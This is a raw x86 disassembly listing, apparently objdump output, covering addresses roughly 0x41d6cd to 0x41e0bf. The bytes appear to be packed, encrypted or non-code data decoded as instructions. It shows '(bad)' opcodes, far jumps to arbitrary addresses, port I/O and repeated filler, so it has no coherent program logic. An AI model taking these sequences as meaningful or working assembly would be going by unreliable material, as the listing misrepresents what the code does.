  41d6cd:	je     0x41d6d5
  41d6cf:	je     0x41d73d
  41d6d1:	push   ebx
  41d6d2:	retf   
  41d6d3:	lea    esp,[ebp+0x6e]
  41d6d6:	mov    eax,0xa4694457
  41d6db:	xchg   DWORD PTR [ecx+eiz*2+0x3e],ebp
  41d6df:	jmp    0x41d71f
  41d6e1:	pop    edi
  41d6e2:	arpl   di,bx
  41d6e4:	add    BYTE PTR [esi+edi*1+0x42],bl
  41d6e8:	add    DWORD PTR [eax],eax
  41d6ea:	ds inc edx
  41d6ec:	add    DWORD PTR [eax],eax
  41d6ee:	ds sbb al,0x28
  41d6f1:	js     0x41d74e
  41d6f3:	inc    edx
  41d6f4:	push   esi
  41d6f5:	ins    DWORD PTR es:[edi],dx
	...
  41d71e:	add    BYTE PTR [eax],al
  41d720:	pusha  
  41d721:	mov    dh,0x39
  41d723:	pop    edi
  41d724:	dec    esp
  41d725:	lahf   
  41d726:	push   eax
  41d727:	push   ebp
  41d728:	daa    
  41d729:	pushf  
  41d72a:	push   esi
  41d72b:	aas    
  41d72c:	or     al,0x42
  41d72e:	and    dh,BYTE PTR [eax+0x23]
  41d731:	lods   al,BYTE PTR ds:[esi]
  41d732:	add    al,0xff
  41d734:	mov    eax,ds:0x23698141
  41d739:	nop
  41d73a:	and    ah,BYTE PTR [ebx+0x22]
  41d73d:	push   ecx
  41d73e:	repz sub eax,0x206e22
  41d744:	jmp    0xe3872cd6
  41d749:	jne    0x41d78e
  41d74b:	popa   
  41d74c:	jmp    0x226c:0xfd633a5a
  41d753:	jno    0x41d726
  41d755:	gs daa 
  41d757:	push   ecx
  41d758:	jecxz  0x41d7aa
  41d75a:	ss addr16 loope 0x41d7b1
  41d75e:	cmp    al,0x64
  41d760:	adc    dh,BYTE PTR ds:[ebx]
  41d763:	ins    DWORD PTR es:[edi],dx
  41d764:	fstp   QWORD PTR [esi]
  41d766:	ss jno 0x41d6f0
  41d769:	and    BYTE PTR [ebp+0x6d],dl
  41d76c:	lea    edx,[edi]
  41d76e:	ss jno 0x41d708
  41d771:	sub    DWORD PTR [edi],ebx
  41d773:	inc    edi
  41d774:	call   0x2410:0xa36e0144
  41d77b:	jo     0x41d724
  41d77d:	push   ebp
  41d77e:	repz sub eax,0x1f935ba2
	...
  41d7ac:	add    BYTE PTR [eax],al
  41d7ae:	mov    eax,ds:0xcb393784
  41d7b4:	add    BYTE PTR [ebp+0x6d],0xb9
  41d7b8:	test   DWORD PTR [eax],ebp
  41d7ba:	ins    BYTE PTR es:[edi],dx
  41d7bb:	cdq    
  41d7bc:	jns    0x41d7e6
  41d7be:	pop    ebp
  41d7bf:	pop    ebx
  41d7c0:	lods   eax,DWORD PTR ds:[esi]
  41d7c1:	sub    BYTE PTR [edx-0x58],dl
  41d7c4:	jp     0x41d7ee
  41d7c6:	dec    esp
  41d7c7:	cwde   
  41d7c8:	jge    0x41d802
  41d7ca:	push   ebp
  41d7cb:	pop    ebx
  41d7cc:	out    0x20,eax
  41d7ce:	push   edx
  41d7cf:	mov    eax,0xb76bf61a
  41d7d4:	inc    ebx
  41d7d5:	and    BYTE PTR [esi],bh
  41d7d7:	scas   al,BYTE PTR es:[edi]
  41d7d8:	push   ebx
  41d7d9:	sub    ebx,edi
  41d7db:	retf   0x224c
  41d7de:	cmpxchg8b QWORD PTR [esi+0x36]
  41d7e2:	stc    
  41d7e3:	mov    ecx,0xbc3e044c
  41d7e8:	inc    ebx
  41d7e9:	cmp    ch,cl
  41d7eb:	retf   0xf510
  41d7ee:	dec    edi
  41d7ef:	add    DWORD PTR [ebx],0x285aea20
  41d7f5:	and    dl,ah
  41d7f7:	ror    DWORD PTR [edx],0x23
  41d7fa:	repnz mov bh,0x28
  41d7fd:	and    bl,dl
  41d7ff:	mov    ds:0xc3d21b0d,eax
  41d804:	or     BYTE PTR [eax],ah
  41d806:	(bad)  
  41d808:	add    al,0x55
  41d80a:	loope  0x41d7c2
  41d80c:	out    0x44,eax
  41d80e:	(bad)  
  41d80f:	mov    bh,0xca
  41d811:	sbb    al,0x0
	...
  41d83b:	add    BYTE PTR [edx-0x5fd93d3e],dl
  41d841:	mov    al,ds:0xb89c1ec4
  41d846:	mov    ecx,0xb7c49634
  41d84b:	add    eax,DWORD PTR [eax+0x58cc00cd]
  41d851:	lods   al,BYTE PTR ds:[esi]
  41d852:	lds    edi,FWORD PTR [di]
  41d855:	pushf  
  41d856:	jb     0x41d7e4
  41d858:	pop    ecx
  41d859:	sahf   
  41d85a:	outs   dx,BYTE PTR ds:[esi]
  41d85b:	xchg   esp,eax
  41d85c:	pop    eax
  41d85d:	mov    esi,0xbe298872
  41d862:	aas    
  41d863:	jmp    0x8da5a5ea
  41d868:	ja     0x41d837
  41d86a:	arpl   WORD PTR [ebp+edi*1+0xd70729c],ax
  41d871:	mov    DWORD PTR [ebp-0x7c],0x4c71ae11
  41d878:	or     BYTE PTR [ebx+eiz*2+0x729c4260],ah
  41d87f:	push   eax
  41d880:	push   0xffffffc7
  41d882:	inc    ebx
  41d883:	push   ecx
  41d884:	jb     0x41d846
  41d886:	jb     0x41d8c5
  41d888:	arpl   WORD PTR [esi-0x32fd1689],di
  41d88e:	ja     0x41d8c9
  41d890:	push   esi
  41d891:	xchg   edi,eax
  41d892:	arpl   WORD PTR [edx],di
  41d894:	inc    esi
  41d895:	int    0x6d
  41d897:	and    BYTE PTR [ebx-0x42],al
  41d89a:	ja     0x41d885
  41d89c:	add    cl,ch
  41d89e:	ja     0x41d8b9
	...
  41d8c8:	add    BYTE PTR [eax],al
  41d8ca:	lods   eax,DWORD PTR ss:[esi]
  41d8cc:	arpl   bp,di
  41d8ce:	and    BYTE PTR [edx-0x4004f38f],dh
  41d8d4:	outs   dx,BYTE PTR ds:[esi]
  41d8d5:	cmc    
  41d8d6:	and    bl,dl
  41d8d8:	je     0x41d8c3
  41d8da:	jmp    0x41d899
  41d8dc:	jbe    0x41d8e2
  41d8de:	adc    bh,al
  41d8e0:	push   esp
  41d8e1:	(bad)  
  41d8e2:	jmp    0x709e:0x3dc76cbd
  41d8e9:	int3   
  41d8ea:	pop    edi
  41d8eb:	stos   DWORD PTR es:[edi],eax
  41d8ec:	jb     0x41d8ac
  41d8ee:	bound  edi,QWORD PTR [ecx+esi*2+0x6ba8e400]
  41d8f5:	imul   eax,DWORD PTR [edx],0x7b
  41d8f8:	add    BYTE PTR [ecx-0x6],cl
  41d8fb:	mov    WORD PTR [ecx+0x72],fs
  41d8fe:	les    edi,FWORD PTR [ebx+0x6e]
  41d901:	popa   
  41d902:	mov    ds:0xc06f4c79,eax
  41d907:	and    DWORD PTR [ecx+0x64],0xffffff98
  41d90b:	jp     0x41d95e
  41d90d:	jae    0x41d8d1
  41d90f:	xchg   BYTE PTR [eax],al
  41d911:	inc    edi
  41d912:	mov    dl,0x88
  41d914:	push   esp
  41d915:	outs   dx,DWORD PTR ds:[esi]
  41d916:	lods   al,BYTE PTR ds:[esi]
  41d917:	jns    0x41d987
  41d919:	dec    ecx
  41d91a:	mov    ecx,0x4a726b82
  41d91f:	jge    0x41d995
  41d921:	imul   ebp,DWORD PTR [eax+0x71],0x71084300
  41d928:	jbe    0x41d98f
  41d92a:	adc    eax,0x694f93
	...
  41d957:	add    BYTE PTR [ebx],al
  41d959:	mov    bl,0x6b
  41d95b:	push   ebx
  41d95c:	arpl   WORD PTR [ebp-0x53ff919b],cx
  41d962:	gs fs push di
  41d966:	dec    esp
  41d967:	outs   dx,DWORD PTR ds:[esi]
  41d968:	add    BYTE PTR [eax+0x6e],dh
  41d96b:	push   ebp
  41d96c:	and    al,0x82
  41d96e:	jb     0x41d9b1
  41d970:	addr16 nop
  41d972:	imul   ebp,DWORD PTR [edi+0x3c],0xffffff92
  41d976:	jo     0x41d9c8
  41d978:	inc    ebp
  41d979:	outs   dx,BYTE PTR ds:[esi]
  41d97a:	jbe    0x41d9e5
  41d97c:	dec    ebx
  41d97d:	and    BYTE PTR [ebx+0x65],0x31
  41d981:	jbe    0x41d9ef
  41d983:	jne    0x41d9c7
  41d985:	xchg   esi,eax
  41d986:	add    BYTE PTR [ecx+0x43],al
  41d989:	jne    0x41d9fc
  41d98b:	jae    0x41d9f0
  41d98d:	test   al,0x6b
  41d98f:	imul   eax,DWORD PTR [edx],0x6e
  41d992:	push   eax
  41d993:	jb     0x41d9d3
  41d995:	sbb    esi,DWORD PTR [ebx]
  41d997:	addr16 call 0x142:0xad632617
  41d99f:	popa   
  41d9a0:	mov    WORD PTR [ebx],ds
  41d9a2:	xor    DWORD PTR [ebp+ecx*2+0x54],esi
  41d9a6:	(bad)  [ebx-0x66]
  41d9a9:	push   cs
  41d9aa:	add    DWORD PTR [ecx-0x74],eax
  41d9ad:	sti    
  41d9ae:	xor    BYTE PTR [ebx+edx*4-0x20],dh
  41d9b2:	xor    BYTE PTR [edx+0x61],dh
  41d9b5:	out    dx,al
  41d9b6:	daa    
  41d9b7:	popa   
  41d9b8:	jb     0x41d9b0
  41d9ba:	and    esi,DWORD PTR [eax+eax*1+0x0]
	...
  41d9e6:	pop    edi
  41d9e7:	inc    edx
  41d9e8:	inc    edx
  41d9e9:	arpl   WORD PTR [esi+eax*8+0x3e],cx
  41d9ed:	jo     0x41da4a
  41d9ef:	fcom   DWORD PTR [ecx+0x77]
  41d9f2:	dec    ebp
  41d9f3:	(bad)  
  41d9f4:	sub    BYTE PTR [ebx+0x6d],ch
  41d9f7:	scas   al,BYTE PTR es:[edi]
  41d9f8:	sbb    eax,0x4832372
  41d9fd:	inc    ecx
  41d9fe:	sbb    esi,DWORD PTR [eax+edi*1+0x1fa71843]
  41da05:	inc    ecx
  41da06:	sbb    edx,DWORD PTR [eax+edi*1+0x21ab2067]
  41da0d:	pop    edi
  41da0e:	or     bl,BYTE PTR [edi+0x75184731]
  41da14:	cmp    BYTE PTR [ebp+0xc],ch
  41da17:	pop    edi
  41da18:	add    al,0x41
  41da1a:	jecxz  0x41da8f
  41da1c:	cmp    BYTE PTR [ecx-0x1e],al
  41da1f:	pop    eax
  41da20:	xor    DWORD PTR [ebx+0xd],esp
  41da23:	sbb    ax,0xdb72
  41da27:	inc    ecx
  41da28:	inc    edx
  41da29:	jb     0x41da02
  41da2b:	push   ecx
  41da2c:	xor    eax,0x3852dd3f
  41da31:	addr16 int3 
  41da33:	push   esi
  41da34:	inc    ecx
  41da35:	arpl   sp,cx
  41da37:	pop    edx
  41da38:	fistp  DWORD PTR [eax+eiz*4]
  41da3b:	(bad)  
  41da3c:	retf   0xaa24
  41da3f:	mov    eax,0xc5a131b7
  41da44:	enter  0x9d37,0xa2
  41da48:	int3   
  41da49:	sub    al,0x0
	...
  41da73:	add    BYTE PTR [esi],bh
  41da75:	pop    ebx
  41da76:	int3   
  41da77:	xor    bl,BYTE PTR [ecx-0x65e03483]
  41da7d:	pop    ebx
  41da7e:	pushf  
  41da7f:	xor    bl,BYTE PTR [ecx+0x7f378c96]
  41da85:	mov    esi,0xbd63338c
  41da8a:	mov    WORD PTR ds:0x3788ab72,ds
  41da90:	push   esi
  41da91:	pushf  
  41da92:	out    0x3,eax
  41da94:	dec    esi
  41da95:	retf   0x1e73
  41da98:	dec    esp
  41da99:	mov    eax,0xbf5ddd8a
  41da9e:	jnp    0x41daa3
  41daa0:	outs   dx,BYTE PTR ds:[esi]
  41daa1:	stos   BYTE PTR es:[edi],al
  41daa2:	pop    ebx
  41daa3:	sbb    eax,0x322ab82c
  41daa8:	sbb    eax,0x1275bbc
  41daad:	mov    ebp,0xbd01385a
  41dab2:	dec    edx
  41dab3:	daa    
  41dab4:	ds pop ebx
  41dab6:	out    0x3,eax
  41dab8:	ds pop ebx
  41daba:	out    0x3,eax
  41dabc:	ds pop ebx
  41dabe:	out    0x3,eax
  41dac0:	ds pop ebx
  41dac2:	out    0x3,eax
  41dac4:	ds pop ebx
  41dac6:	out    0x3,eax
  41dac8:	ds pop ebx
  41daca:	out    0x3,eax
  41dacc:	ds pop ebx
  41dace:	out    0x3,eax
  41dad0:	ds pop ebx
  41dad2:	out    0x3,eax
  41dad4:	ds pop ebx
  41dad6:	out    0x3,eax
	...
  41db00:	add    BYTE PTR [eax],al
  41db02:	ds pop ebx
  41db04:	add    cl,ch
  41db06:	cmp    eax,0x3de9005b
  41db0b:	pop    ebx
  41db0c:	add    cl,ch
  41db0e:	cmp    eax,0x3de9005b
  41db13:	pop    ebx
  41db14:	add    cl,ch
  41db16:	cmp    eax,0x3de9005b
  41db1b:	pop    ebx
  41db1c:	add    cl,ch
  41db1e:	cmp    eax,0x3de9005b
  41db23:	pop    ebx
  41db24:	add    cl,ch
  41db26:	cmp    eax,0x3de9005b
  41db2b:	pop    ebx
  41db2c:	add    cl,ch
  41db2e:	cmp    eax,0x3de9005b
  41db33:	pop    ebx
  41db34:	add    cl,ch
  41db36:	cmp    eax,0x3de9005b
  41db3b:	pop    ebx
  41db3c:	add    cl,ch
  41db3e:	cmp    eax,0x3de9005b
  41db43:	pop    ebx
  41db44:	add    cl,ch
  41db46:	cmp    eax,0x3de9005b
  41db4b:	pop    ebx
  41db4c:	add    cl,ch
  41db4e:	cmp    eax,0x3de9005b
  41db53:	pop    ebx
  41db54:	add    BYTE PTR [edx+0x4a],bl
  41db57:	mov    edx,0x8baf3d6c
  41db5c:	cs dec ebp
  41db5e:	pop    esi
  41db5f:	mov    edi,0x98521a00
  41db64:	arpl   WORD PTR ds:0x0,di
	...
  41db8e:	add    BYTE PTR [eax],al
  41db90:	add    al,al
  41db92:	ins    BYTE PTR es:[edi],dx
  41db93:	inc    ebp
  41db94:	pop    ecx
  41db95:	leave  
  41db96:	push   eax
  41db97:	or     BYTE PTR [esi],dh
  41db99:	ret    
  41db9a:	aas    
  41db9b:	jmp    0xe94236dd
  41dba0:	cmp    eax,0x3a284951
  41dba5:	pusha  
  41dba6:	dec    esp
  41dba7:	add    BYTE PTR [esi],ah
  41dba9:	push   edi
  41dbaa:	sbb    ecx,DWORD PTR [esi+eiz*1+0x57]
  41dbae:	xor    DWORD PTR [esi+edx*1+0x57],ecx
  41dbb2:	aas    
  41dbb3:	dec    esp
  41dbb4:	push   ss
  41dbb5:	push   edi
  41dbb6:	dec    edi
  41dbb7:	dec    esp
  41dbb8:	out    0x58,al
  41dbba:	pop    edi
  41dbbb:	dec    esp
  41dbbc:	out    0x58,al
  41dbbe:	js     0x41dc0c
  41dbc0:	(bad)  
  41dbc1:	pop    eax
  41dbc2:	mov    ecx,DWORD PTR [esi+edx*8+0x58]
  41dbc6:	lahf   
  41dbc7:	dec    esp
  41dbc8:	out    0x58,al
  41dbca:	mov    esp,0xe058e64c
  41dbcf:	dec    esp
  41dbd0:	(bad)  
  41dbd1:	pop    eax
  41dbd2:	stc    
  41dbd3:	dec    esp
  41dbd4:	(bad)  
  41dbd5:	pop    eax
  41dbd6:	add    BYTE PTR [eax],al
  41dbd8:	out    0x58,eax
  41dbda:	std    
  41dbdb:	jmp    edi
  41dbdd:	fadd   DWORD PTR [eax]
  41dbdf:	add    bh,dl
  41dbe1:	pop    eax
  41dbe2:	dec    ecx
  41dbe3:	jns    0x41dbdc
  41dbe5:	xchg   esp,eax
  41dbe6:	imul   esp,DWORD PTR [ebx+0x5a],0x6d
  41dbea:	popa   
  41dbeb:	outs   dx,BYTE PTR ds:[esi]
  41dbec:	dec    ebx
  41dbed:	mov    eax,DWORD PTR [eax]
  41dbef:	add    edi,edx
  41dbf1:	pop    eax
  41dbf2:	sbb    BYTE PTR [edx],0x0
	...
  41dc1d:	add    bh,dl
  41dc1f:	pop    eax
  41dc20:	add    BYTE PTR [ecx+0x17],al
  41dc23:	xchg   DWORD PTR [ecx+eiz*2+0xb],eax
  41dc27:	jbe    0x41dc29
  41dc29:	add    DWORD PTR [edi-0x68e37fa8],edx
  41dc2f:	pop    eax
  41dc30:	add    BYTE PTR [eax+esi*8+0x73],cl
  41dc34:	pop    ebp
  41dc35:	ins    BYTE PTR es:[edi],dx
  41dc36:	inc    edi
  41dc37:	xchg   esi,eax
  41dc38:	jo     0x41dcaa
  41dc3a:	pop    ebx
  41dc3b:	jbe    0x41dcb1
  41dc3d:	popa   
  41dc3e:	xchg   edi,eax
  41dc3f:	push   edi
  41dc40:	add    BYTE PTR [eax],al
  41dc42:	out    0x36,eax
  41dc44:	std    
  41dc45:	jmp    DWORD PTR [edi-0x6b]
  41dc48:	pop    ebp
  41dc49:	arpl   WORD PTR [esi],di
  41dc4b:	pop    edx
  41dc4c:	pop    ds
  41dc4d:	add    BYTE PTR [edi],bh
  41dc4f:	inc    edx
  41dc50:	add    DWORD PTR [eax+0x1421f],eax
  41dc56:	std    
  41dc57:	pop    esp
  41dc58:	sbb    DWORD PTR [ecx-0x29],ebp
  41dc5b:	pop    esi
  41dc5c:	xor    eax,0x1423f00
  41dc61:	sbb    BYTE PTR [edx+eax*2+0x1],0x0
  41dc66:	xchg   BYTE PTR [ebx],ch
  41dc68:	ss je  0x41dc04
  41dc6b:	xor    BYTE PTR [eax+eax*1],ch
  41dc6e:	cmp    al,0x42
  41dc70:	add    DWORD PTR [eax+0x14243],eax
  41dc76:	sbb    DWORD PTR [ebx],0xffffffe1
  41dc79:	inc    ebx
  41dc7a:	cdq    
  41dc7b:	and    DWORD PTR [eax],esi
  41dc7d:	imul   ebx,DWORD PTR [ebx+0x712d0c],0x0
	...
  41dcac:	ds inc eax
  41dcae:	add    DWORD PTR [eax],eax
  41dcb0:	mov    esi,0x3e000120
  41dcb5:	add    DWORD PTR [edx],ebx
  41dcb7:	imul   edx,DWORD PTR [ebx-0x33],0x17
  41dcbb:	and    BYTE PTR [edi-0x2e],bh
  41dcbe:	xor    DWORD PTR [edi+ebx*2-0x3a],eax
  41dcc2:	and    al,0x0
  41dcc4:	aas    
  41dcc5:	inc    edx
  41dcc6:	add    DWORD PTR [eax+0x14219],eax
  41dccc:	or     edi,DWORD PTR [ebx-0x5ed8b01c]
  41dcd2:	xor    BYTE PTR [ebx+0x2c],dh
  41dcd5:	lahf   
  41dcd6:	xor    eax,0x1423c00
  41dcdb:	sub    BYTE PTR [eax+0x42],0x1
  41dcdf:	add    ch,bh
  41dce1:	pushf  
  41dce2:	pop    ss
  41dce3:	imul   ebx,DWORD PTR [ecx],0xffffff94
  41dce6:	in     al,0x43
  41dce8:	adc    DWORD PTR [ecx+0x5ae36b2f],esp
  41dcee:	adc    eax,0xe95aef30
  41dcf3:	add    edi,DWORD PTR [esi]
  41dcf5:	fcmovnb st,st(5)
  41dcf7:	add    edi,DWORD PTR [esi]
  41dcf9:	pop    ebx
  41dcfa:	sub    bl,BYTE PTR [ebx]
  41dcfc:	in     eax,0xbd
  41dcfe:	push   ss
  41dcff:	sbb    bl,BYTE PTR [esi]
  41dd01:	call   0x3700:0xbce11903
  41dd08:	retf   0x8c8
  41dd0b:	xor    BYTE PTR [ecx+0xe3ccd1],ah
	...
  41dd39:	add    BYTE PTR [ebp-0x50e83146],cl
  41dd3f:	pop    ebx
  41dd40:	call   0x171d1b48
  41dd45:	add    al,0x3e
  41dd47:	pop    ebx
  41dd48:	test   al,0x1f
  41dd4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd4b:	mov    ah,0xcd
  41dd4d:	sbb    al,0x8f
  41dd4f:	iret   
  41dd50:	mov    ecx,0xb5b48a24
  41dd55:	and    BYTE PTR [esi],bl
  41dd57:	scas   eax,DWORD PTR es:[edi]
  41dd58:	xchg   esi,eax
  41dd59:	sbb    ah,BYTE PTR [edx-0x32]
  41dd5c:	out    0x4,eax
  41dd5e:	ds pop ebx
  41dd60:	add    BYTE PTR ds:0xe75b,bh
  41dd65:	push   ebx
  41dd66:	pop    ebp
  41dd67:	int    0x7a
  41dd69:	sbb    ah,BYTE PTR [eax-0x44]
  41dd6c:	mov    eax,DWORD PTR [ebx]
  41dd6e:	outs   dx,DWORD PTR ds:[esi]
  41dd6f:	mov    edx,0xbc4b2f8d
  41dd74:	jns    0x41dd96
  41dd76:	sbb    bl,BYTE PTR [eax-0x45d3dab0]
  41dd7c:	pop    edx
  41dd7d:	sbb    DWORD PTR [eax],esp
  41dd7f:	iret   
  41dd80:	xor    edx,DWORD PTR [ecx+0x19]
  41dd83:	mov    ecx,0xce131943
  41dd88:	and    eax,DWORD PTR [ebp+0xd]
  41dd8b:	int    0x39
  41dd8d:	pop    ds
  41dd8e:	sbb    bh,cl
  41dd90:	add    BYTE PTR [edi],bl
  41dd92:	and    ebp,ecx
  41dd94:	jno    0x41ddd6
  41dd96:	push   edi
  41dd97:	mov    ecx,0xcb222c5c
  41dd9c:	ins    BYTE PTR es:[edi],dx
  41dd9d:	push   cs
	...
  41ddc6:	add    BYTE PTR [eax],al
  41ddc8:	xor    BYTE PTR [esi-0x4cf4ca8e],bh
  41ddce:	arpl   bp,di
  41ddd0:	xor    DWORD PTR [ebx+0x46],edi
  41ddd3:	push   ss
  41ddd4:	ss mov edi,0x5b12fb63
  41ddda:	arpl   cx,si
  41dddc:	or     eax,0x58fb6db7
  41dde1:	int    0x2e
  41dde3:	int3   
  41dde4:	gs mov esi,0x7910ba00
  41ddea:	sub    ebx,DWORD PTR [ecx+ecx*1]
  41dded:	jns    0x41de27
  41ddef:	jmp    0xe9423931
  41ddf4:	push   0xffffffbe
  41ddf6:	inc    edi
  41ddf7:	int3   
  41ddf8:	dec    ebp
  41ddf9:	mov    esi,0xb926ba72
  41ddfe:	pop    edi
  41ddff:	mov    ch,0x58
  41de01:	stos   DWORD PTR es:[edi],eax
  41de02:	jb     0x41dd94
  41de04:	das    
  41de05:	ret    0x846c
  41de08:	push   ds
  41de09:	mov    esi,0xaf40ba00
  41de0e:	popa   
  41de0f:	mov    ebp,DWORD PTR [ebp-0x33]
  41de12:	addr16 jg 0x41de49
  41de15:	mov    bh,0x63
  41de17:	xchg   BYTE PTR [eax],ch
  41de19:	pop    ebx
  41de1a:	push   ecx
  41de1b:	mov    WORD PTR [edx-0x4d],?
  41de1e:	pop    edi
  41de1f:	jg     0x41de7f
  41de21:	mov    esi,0xc26e564e
  41de26:	pushaw 
  41de28:	adc    cl,ch
  41de2a:	addr16 pop edi
	...
  41de54:	add    BYTE PTR [eax],al
  41de56:	inc    ebp
  41de57:	mov    bh,0x63
  41de59:	inc    esi
  41de5a:	cmp    DWORD PTR [ebx+0x51],ebx
  41de5d:	add    BYTE PTR [edx],al
  41de5f:	mov    al,ds:0x8af66572
  41de64:	popa   
  41de65:	push   esp
  41de66:	clc    
  41de67:	addr16 popa 
  41de69:	outs   dx,BYTE PTR ds:[esi]
  41de6a:	push   edi
  41de6b:	xchg   ecx,eax
  41de6c:	gs jbe 0x41debd
  41de6f:	arpl   WORD PTR [ecx+0x67],sp
  41de72:	inc    edx
  41de73:	pop    edi
  41de74:	dec    edi
  41de75:	gs adc eax,0x326b5f7e
  41de7b:	(bad)  
  41de7c:	push   eax
  41de7d:	jb     0x41dead
  41de7f:	lea    esp,[ebp+0x6c]
  41de82:	inc    edx
  41de83:	jl     0x41dee6
  41de85:	add    BYTE PTR [edx+ebp*2],ah
  41de88:	push   edx
  41de89:	gs xor al,0x79
  41de8c:	imul   esi,DWORD PTR [edx+0x2],0xffffffad
  41de90:	jb     0x41defb
  41de92:	adc    DWORD PTR [esi+0x6c],esp
  41de95:	lock imul eax,DWORD PTR gs:[eax],0x6e860253
  41de9d:	arpl   bp,dx
  41de9f:	imul   ebx,DWORD PTR [ebp+0x73],0x6f71ae02
  41dea6:	ret    
  41dea7:	jge    0x41def9
  41dea9:	jb     0x41dea9
  41deab:	mov    ah,BYTE PTR [ebp+0x6c]
  41deae:	ret    0x617b
  41deb1:	add    BYTE PTR [ecx+ebp*2+0x65c4733d],ah
  41deb8:	arpl   WORD PTR [esi+0x0],bp
	...
  41dee3:	add    BYTE PTR [edi-0x39929a72],dl
  41dee9:	mov    ?,WORD PTR [ebp+0x54]
  41deec:	mov    eax,0xa76e6167
  41def1:	mov    fs,WORD PTR [ebp+0x76]
  41def4:	mov    esi,0x2676170
  41def9:	pop    edi
  41defa:	add    BYTE PTR [eax+0x58],dl
  41defd:	lods   al,BYTE PTR ds:[esi]
  41defe:	push   esp
  41deff:	and    BYTE PTR [esi],bh
  41df01:	push   edi
  41df02:	xor    DWORD PTR [eax],esp
  41df04:	push   es
  41df05:	mov    ss,WORD PTR [eax+0x50]
  41df08:	popa   
  41df09:	inc    ebx
  41df0a:	shr    DWORD PTR [edi],cl
  41df0c:	cmp    ecx,DWORD PTR [ecx+edi*1+0x6d]
  41df10:	or     eax,0x231fea86
  41df15:	test   edi,esi
  41df17:	or     edi,edi
  41df19:	push   esp
  41df1a:	and    DWORD PTR [ebx-0x12],esp
  41df1d:	ins    DWORD PTR es:[edi],dx
  41df1e:	jmp    0x440a:0xd721141f
  41df25:	jae    0x41df48
  41df27:	popa   
  41df28:	fild   DWORD PTR [ecx+0x2d]
  41df2b:	sub    eax,DWORD PTR [ebx]
  41df2d:	pop    eax
  41df2e:	and    DWORD PTR [ebp-0x26],ebp
  41df31:	pop    edx
  41df32:	push   ss
  41df33:	gs je  0x41df48
  41df36:	sbb    al,0x64
  41df38:	fwait
  41df39:	xor    BYTE PTR ds:0xd53bb267,ch
  41df3f:	pop    ds
  41df40:	push   esp
  41df41:	ins    DWORD PTR es:[edi],dx
  41df42:	xor    edi,DWORD PTR [ebx]
  41df44:	dec    esi
  41df45:	daa    
  41df46:	test   DWORD PTR [eax+0x0],0x0
	...
  41df71:	add    BYTE PTR [ecx-0x679cd2d0],ah
  41df77:	push   cs
  41df78:	fmul   DWORD PTR [ebx-0x65]
  41df7b:	and    BYTE PTR [esi],bl
  41df7d:	je     0x41dfe5
  41df7f:	dec    esp
  41df80:	loope  0x41dfa4
  41df82:	(bad)  
  41df83:	out    0xf7,eax
  41df85:	or     DWORD PTR [ebp-0x27],edi
  41df88:	adc    ch,BYTE PTR [esi+0x5b]
  41df8b:	aad    0x2c
  41df8d:	addr16 imul ecx,eax,0xee5d1fe7
  41df94:	adc    eax,0xf7376371
  41df99:	inc    eax
  41df9a:	push   ecx
  41df9b:	loopne 0x41dfc9
  41df9d:	arpl   WORD PTR [eax],bp
  41df9f:	into   
  41dfa0:	fcom   DWORD PTR [ebx+0x37]
  41dfa3:	pop    ebx
  41dfa4:	push   edi
  41dfa5:	and    DWORD PTR [ebx+edi*2+0x48],esp
  41dfa9:	xor    al,0x2e
  41dfab:	mov    bh,0x40
  41dfad:	and    edi,ecx
  41dfaf:	into   
  41dfb0:	inc    eax
  41dfb1:	pop    ss
  41dfb2:	and    BYTE PTR [eax+0x56],bh
  41dfb5:	and    edx,DWORD PTR [edx]
  41dfb7:	mov    esi,0xcf0ed933
  41dfbc:	cmp    DWORD PTR [ecx],esp
  41dfbe:	sbb    DWORD PTR [esi-0x48010624],esi
  41dfc4:	adc    eax,0x13b8dd30
  41dfc9:	frndint 
  41dfcb:	mov    eax,0xb1e2170a
  41dfd0:	std    
  41dfd1:	push   ds
  41dfd2:	adc    al,0x7b
  41dfd4:	or     DWORD PTR ds:0x0,ebx
	...
  41dffe:	add    BYTE PTR [eax],al
  41e000:	fdivr  DWORD PTR [ecx+0x55352cf9]
  41e006:	sbb    al,0x33
  41e008:	popf   
  41e009:	leave  
  41e00a:	mov    esp,0xd5c09b44
  41e00f:	das    
  41e010:	fs jnp 0x41dfbf
  41e013:	push   ss
  41e014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e015:	mov    ah,0xc3
  41e017:	pop    ss
  41e018:	jns    0x41e090
  41e01a:	adc    edx,esi
  41e01c:	popa   
  41e01d:	jnp    0x41e02e
  41e01f:	and    ebx,DWORD PTR [ebx-0x75db4848]
  41e025:	mov    ah,0xc9
  41e027:	pop    ss
  41e028:	pop    ebp
  41e029:	add    BYTE PTR [edi],0x39
  41e02c:	(bad)  
  41e02d:	xchg   esp,eax
  41e02e:	lods   al,BYTE PTR ds:[esi]
  41e02f:	jecxz  0x41e05d
  41e031:	jne    0x41e00a
  41e033:	jmp    0xb662:0x1580ae41
  41e03a:	xchg   esi,eax
  41e03b:	xor    bl,BYTE PTR [esi]
  41e03d:	test   BYTE PTR [edi-0x13aecb24],bh
  41e043:	stc    
  41e044:	rcr    DWORD PTR [ecx-0x30ac7a00],0x63
  41e04b:	jg     0x41e0ae
  41e04d:	jb     0x41e09b
  41e04f:	dec    esp
  41e050:	push   eax
  41e051:	shl    BYTE PTR [ecx+edx*2-0x6c],0x46
  41e056:	dec    ecx
  41e057:	inc    esi
  41e058:	pop    edi
  41e059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e05a:	je     0x41e09c
  41e05c:	sub    esi,DWORD PTR [ebp-0x65b516c6]
  41e062:	push   esp
  41e063:	or     DWORD PTR [eax],eax
	...
  41e08d:	add    BYTE PTR [ecx-0x35],ah
  41e090:	and    BYTE PTR [ecx],ah
  41e092:	push   cs
  41e093:	scas   eax,DWORD PTR es:[edi]
  41e094:	push   eax
  41e095:	(bad)  
  41e096:	ins    BYTE PTR es:[edi],dx
  41e097:	js     0x41e0c9
  41e099:	hlt    
  41e09a:	addr16 sahf 
  41e09c:	ins    DWORD PTR es:[edi],dx
  41e09d:	sbb    ch,BYTE PTR [esi]
  41e09f:	and    DWORD PTR [eax],0xa520ecc
  41e0a5:	sub    BYTE PTR [edi],bl
  41e0a7:	mov    esp,0x8119f963
  41e0ac:	and    bl,dl
  41e0ae:	push   0x74
  41e0b0:	or     esp,ebx
  41e0b2:	jl     0x41e070
  41e0b4:	popa   
  41e0b5:	add    al,0x6a
  41e0b7:	iret   
  41e0b8:	sub    ebp,DWORD PTR [ebx+edx*2+0x44c56dbc]
  41e0bf:	mov    ch,0x65
